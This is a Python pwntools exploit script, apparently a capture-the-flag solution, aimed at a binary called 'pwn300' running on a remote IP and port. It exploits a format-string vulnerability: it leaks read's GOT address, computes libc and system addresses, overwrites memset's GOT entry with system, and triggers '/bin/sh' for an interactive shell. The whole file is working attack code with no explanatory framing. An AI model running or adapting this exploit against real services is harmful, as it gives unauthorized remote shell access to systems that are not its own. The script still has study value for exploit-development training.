# coding:utf-8

from pwn import *

#context.log_level = 'debug'

#io = process('./pwn300')
io = remote('218.2.197.235', 10102)

e = ELF('./pwn300')
#libc = e.libc
libc = ELF('../fengshui/libc.32-2.19.so')

def fmt(payload):
	io.recvuntil('choice:\n')
	io.sendline('2')
	io.recvuntil('message\n')
	io.sendline(payload)

	io.recvuntil('choice:\n')
	io.sendline('3')
	io.recvuntil('is:')
	buf = io.recvuntil('\n')
	return buf

#autofmt = FmtStr(fmt)
#offset = autofmt.offset  # 会收发多次才能计算出offset

#print offset # 7

payload = '%8$s' +p32(e.got['read']) 

fmt(payload)


read_addr = u32(fmt(payload)[:4])
libc_base = read_addr -  libc.symbols['read']
system_addr = libc_base + libc.symbols['system']

log.success('read:%#x'%read_addr)
log.success('system:%#x'%system_addr)

payload ='/bin/sh;' + fmtstr_payload(9, {e.got['memset']: system_addr}, write_size='short', numbwritten=8)

#gdb.attach(io, 'b *0x08048837\nc\nx/10wx 0x8049180 ')
io.recvuntil('choice:\n')
io.sendline('2')
io.recvuntil('message\n')
io.sendline(payload)

io.recvuntil('choice:\n')
io.sendline('3')
io.recv()
io.sendline('2')

io.interactive()
